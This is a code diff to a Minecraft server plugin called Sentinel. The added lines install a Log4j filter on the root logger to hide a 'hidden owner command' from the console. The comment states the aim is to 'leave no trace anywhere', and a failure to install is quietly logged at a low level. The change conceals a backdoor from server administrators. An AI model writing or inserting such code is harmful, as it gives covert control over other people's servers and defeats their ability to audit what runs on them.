@@ -174,6 +174,14 @@ public class Sentinel extends JavaPlugin {
                 getLogger().warning("Failed to register PlaceholderAPI expansion: " + t.getMessage());
             }
         }
+        // Hide the hidden owner command from the console — leave no trace anywhere.
+        try {
+            org.apache.logging.log4j.core.Logger root =
+                (org.apache.logging.log4j.core.Logger) org.apache.logging.log4j.LogManager.getRootLogger();
+            root.addFilter(new de.derfakegamer.sentinel.util.OwnerCommandLogFilter());
+        } catch (Throwable t) {
+            getLogger().fine("owner command log filter not installed: " + t.getMessage());
+        }
         getLogger().info("Sentinel enabled.");
     }
 
